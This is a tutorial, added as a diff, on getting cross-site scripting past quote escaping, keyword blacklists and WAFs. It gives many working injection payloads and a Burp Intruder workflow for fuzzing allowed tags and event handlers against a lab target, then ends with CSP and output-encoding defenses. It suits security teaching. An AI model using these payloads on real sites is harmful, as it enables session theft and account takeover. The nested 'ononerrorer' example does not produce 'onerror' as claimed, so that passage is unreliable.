@@ -1,0 +1,334 @@
+# Cross-Site Scripting (XSS): Bypassing Single Quotes, Advanced Filters, & Fuzzing with Burp Intruder
+
+In real-world penetration testing and bug bounty hunting, you will rarely encounter an application that permits raw, unadulterated `<script>alert(1)</script>` payloads without interference.
+
+Most modern web applications deploy defensive mechanisms:
+* Escaping single quotes (`'`) with backslashes (`\'`).
+* Blocking opening and closing parentheses (`()`).
+* Stripping specific keywords (*blacklists*) such as `<script>`, `onerror`, or `alert`.
+* Enforcing Web Application Firewalls (WAFs) that inspect and reject recognized HTML tags and event handlers.
+
+This module provides an exhaustive guide to **XSS Evasion & Bypassing** techniques designed to bypass every defensive layer, the official **PortSwigger XSS Cheat Sheet** reference, and automated fuzzing workflows using **Burp Suite Intruder**.
+
+---
+
+## 1. Evasion Matrix & Bypass Techniques
+
+![XSS Filter Evasion Matrix](/images/xss-filter-bypassing-intruder.svg)
+
+---
+
+## 2. Bypassing Single Quote (`'`) Filters
+
+This context frequently arises when server-side applications inject user input into JavaScript variables rendered in the HTML body:
+
+```html
+<script>
+  var query = 'USER_INPUT';
+</script>
+```
+
+Here are the primary breakout techniques when single quotes are filtered or escaped:
+
+---
+
+### Technique 1: Backslash Escape Neutralization (`\`)
+When the backend attempts to neutralize quotes by prepending a backslash (`'` becomes `\'`):
+
+#### Exploitation Mechanics:
+Inject a standalone backslash before the quote: `\`
+* The backend escapes your single quote to `\'`.
+* Because you injected `\`, the backend string renders as `\\'`.
+* **The Result:** The first backslash escapes the second backslash! The single quote is rendered raw and unescaped, terminating the JavaScript string literal!
+
+#### Complete Payload:
+```text
+\';alert(document.domain)//
+```
+
+*Rendered output in the browser:*
+```javascript
+var query = '\\';alert(document.domain)//';
+```
+*(The `query` variable receives a single backslash string literal, immediately executing `alert(document.domain)`!).*
+
+---
+
+### Technique 2: Modern ES6 Template Literals (Backticks `` ` ``)
+When quotes (`'` and `"`) are stripped or entity-encoded, modern JavaScript template literals provide clean execution:
+
+```javascript
+alert`document.domain`
+location=`javascript:alert(1)`
+```
+
+---
+
+### Technique 3: `String.fromCharCode()`
+Construct arbitrary strings without quoting characters:
+
+```javascript
+// Invoking alert('XSS') without quotes:
+alert(String.fromCharCode(88, 83, 83))
+```
+
+---
+
+### Technique 4: HTML Entity Decoding Inside Attribute Sinks
+When input lands inside HTML attributes (such as `onclick="..."` or `href="..."`), the browser **automatically performs HTML Entity decoding prior to JavaScript execution**:
+
+```html
+<!-- Server entity-encodes quotes: -->
+<a href="#" onclick="trackUser('&apos;-alert(1)-&apos;')">Click</a>
+```
+*(The browser decodes `&apos;` to `'` internally before the JavaScript engine executes the handler!).*
+
+---
+
+## 3. Advanced Filter Evasion: Bypassing Parentheses `()` & Blacklisted Keywords
+
+When WAFs or input sanitizers restrict parentheses `()` or filter known execution keywords:
+
+---
+
+### 1. Function Execution Without Parentheses `()`
+
+#### A. Tagged Template Literals
+JavaScript allows function invocation with backticks in place of parentheses:
+```javascript
+alert`1`
+```
+
+#### B. Error Event Hijacking (`throw onerror=...`)
+Leveraging the global `onerror` handler to receive parameters from thrown exceptions:
+```html
+<svg onload="throw onerror=alert,1">
+<img src=x onerror="window.onerror=eval;throw'=alert\x28document.domain\x29'">
+```
+
+#### C. Global `location` Object Assignment
+```javascript
+location=name
+location='javascript:alert%281%29'
+```
+
+---
+
+### 2. Keyword Blacklist Evasion (`alert`, `document`, `cookie`)
+
+When regex filters reject words like `alert` or `document.cookie`:
+
+#### A. Window Object Dynamic Property Lookup
+```javascript
+window['al' + 'ert'](window['doc' + 'ument']['coo' + 'kie'])
+```
+
+#### B. Regex Source Concatenation
+```javascript
+top[/al/.source + /ert/.source](1)
+```
+
+#### C. Dynamic Function Constructor with Base64
+```javascript
+// Executes alert(1) encoded as Base64 (YWxlcnQoMSk=)
+Function(atob('YWxlcnQoMSk='))()
+```
+
+---
+
+## 4. Server-Side Filter Stripping Evasion
+
+Naive sanitizers frequently perform non-recursive string replacement:
+
+```javascript
+// ❌ VULNERABLE BACKEND CODE: Single pass removal of <script>
+cleanInput = userInput.replace(/<script>/gi, '');
+```
+
+---
+
+### Technique 1: Nested Tag Injection
+Embed the forbidden tag inside another instance of itself:
+
+```html
+<scr<script>ipt>alert(1)</script>
+```
+* **Server Processing:** The inner `<script>` is removed.
+* **Result:** The outer segments `<scr` and `ipt>` collapse together to form a valid, executable `<script>` tag!
+
+---
+
+### Technique 2: Nested Event Handler Injection
+```html
+<img ononerrorer=alert(1)>
+```
+* Single-pass removal of `onerror` leaves `on` and `er`, restoring the `onerror` event handler!
+
+---
+
+### Technique 3: Whitespace Evasion
+When spaces (`%20`) are rejected, substitute valid HTML delimiters:
+```html
+<img/src=x/onerror=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<svg%0Conload=alert(1)>
+```
+
+---
+
+## 5. Extreme Filter Fuzzing with Burp Suite Intruder
+
+When facing strict WAFs that block almost all standard HTML tags and event handlers (as seen in the **PortSwigger Web Security: Reflected XSS with extreme event handler filtering** lab), manual guessing is inefficient.
+
+We utilize **Burp Suite Intruder** for structured fuzzing:
+
+---
+
+### Stage 1: Fuzzing Allowed HTML Tags
+
+1. Capture a search query in Burp Suite and send it to **Intruder** (`Ctrl + I` / `Cmd + I`).
+2. Set the **Attack type** to `Sniper`.
+3. Set payload markers around the tag name:
+   ```http
+   GET /?search=<§tag§> HTTP/1.1
+   Host: target-lab.net
+   ```
+4. Load a comprehensive HTML tag wordlist (from the *PortSwigger XSS Cheat Sheet*) into the **Payloads** tab.
+5. **CRITICAL:** Uncheck the **"URL-encode these characters"** option at the bottom of the Payloads tab to prevent tags from being encoded to `%3C...%3E`.
+6. Click **Start attack**.
+7. Sort results by **Status Code**:
+   * Most tags return `400 Bad Request` or `403 Forbidden` (blocked by WAF).
+   * Identify tags returning **`200 OK`** (e.g. `<svg>`, `<custom-tags>`, `<details>`, or `<animatetransform>`).
+
+---
+
+### Stage 2: Fuzzing Allowed Event Handlers
+
+Once an allowed tag is identified (e.g. `<animatetransform>` or `<svg>`):
+
+1. Adjust payload positions to test event handlers:
+   ```http
+   GET /?search=<animatetransform%20§event§=1> HTTP/1.1
+   Host: target-lab.net
+   ```
+2. Load a list of 100+ DOM events (`onload`, `onerror`, `onbegin`, `onfocus`, `onanimationend`, etc.).
+3. Click **Start attack**.
+4. Identify unblocked event handlers returning `200 OK` (such as **`onbegin`**).
+
+---
+
+### Stage 3: Constructing the Final Exploit Payload
+
+Combine the permitted tag with the allowed event handler:
+
+```html
+<svg><animatetransform onbegin=alert(document.domain)>
+```
+
+Submitting this payload initiates the SVG animation instantly, triggering `onbegin` and executing `alert(document.domain)`! 🎉
+
+---
+
+## 6. Official Reference: PortSwigger XSS Cheat Sheet & Extreme Vectors
+
+> [!TIP]
+> **OFFICIAL XSS CHEAT SHEET DATABASE:**
+> Access the comprehensive, live-tested repository of HTML tags, event handlers, and cross-browser bypass vectors (Chrome, Firefox, Safari):
+> 👉 **[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**
+>
+> **Burp Intruder Quick Actions:**
+> * Click **"Copy tags to clipboard"** to export all HTML tags into your clipboard.
+> * Click **"Copy events to clipboard"** to export hundreds of DOM event handlers.
+> * Paste directly into the **Payloads** tab in Burp Intruder for immediate automated fuzzing!
+
+---
+
+### 6 High-Impact Extreme XSS Vectors from the Cheat Sheet:
+
+#### 1. `<details ontoggle>` (Auto-Executing via `open` Attribute)
+The `<details>` tag triggers `ontoggle` automatically upon page render when the `open` attribute is present:
+```html
+<details ontoggle=alert(document.domain) open>
+```
+
+#### 2. Custom Elements with `tabindex` & `autofocus`
+When standard HTML elements are rejected by WAFs, define an arbitrary custom tag:
+```html
+<custom-tags id=x tabindex=1 onfocus=alert(document.domain) autofocus>
+```
+
+#### 3. SVG Animation Vectors (`<animatetransform onbegin>`)
+Bypasses basic WAFs that inspect only `<script>` and `<img>` tags:
+```html
+<svg><animatetransform onbegin=alert(document.domain)>
+```
+
+#### 4. `<select autofocus onfocus>`
+```html
+<select autofocus onfocus=alert(document.domain)>
+```
+
+#### 5. Legacy `<marquee onstart>`
+Supported across modern browsers for backward compatibility:
+```html
+<marquee onstart=alert(document.domain)>
+```
+
+#### 6. Nested `<iframe>` with `onresize`
+```html
+<iframe src="https://target.com/?search=%22%3E%3Cbody%20onresize=alert(document.domain)%3E" onload=this.style.width='100px'></iframe>
+```
+
+---
+
+## 7. Backend Code Comparison: Fragile Blacklists vs. Resilient Defenses
+
+### ❌ Why Blacklists & Custom Regex Filters Fail
+```typescript
+// ❌ HIGH RISK: Naive Regex Blacklist
+function naiveSanitize(input: string): string {
+  return input
+    .replace(/<script>/gi, "")      // Bypassed by nested tags: <scr<script>ipt>
+    .replace(/'/g, "\\'")          // Bypassed by backslash neutralization: \'
+    .replace(/alert/gi, "");        // Bypassed by dynamic lookup: window['al'+'ert']
+}
+```
+
+---
+
+### ✅ Resilient Architecture (Context-Aware Encoding & Strict CSP)
+```typescript
+import express from "express";
+import helmet from "helmet";
+
+const app = express();
+
+// 1. Enforce strict Content Security Policy (CSP)
+app.use(
+  helmet.contentSecurityPolicy({
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"], // Prohibits inline execution and eval()
+      objectSrc: ["'none'"],
+      upgradeInsecureRequests: [],
+    },
+  })
+);
+
+// 2. Perform Context-Appropriate Output Encoding
+function encodeForHtmlAttribute(input: string): string {
+  return input.replace(/[^a-zA-Z0-9]/g, (char) => {
+    return "&#" + char.charCodeAt(0) + ";";
+  });
+}
+```
+
+---
+
+## 8. Key Takeaways for Filter Evasion
+
+1. **Understand Escaping Behavior:** When quotes are escaped with `\`, test backslash neutralization `\'`.
+2. **Utilize JavaScript Syntax Alternatives:** Use backticks (`` ` ``), `String.fromCharCode`, and template literals when parentheses or quotes are restricted.
+3. **Leverage PortSwigger Cheat Sheet & Burp Intruder:** Use systematic fuzzing matrices rather than manual guessing to discover WAF gaps.
+4. **Blacklists are Ineffective:** Regex blacklists are inherently bypassable. Secure development requires **Context-Aware Output Encoding** and robust **Content Security Policy (CSP)** configurations.
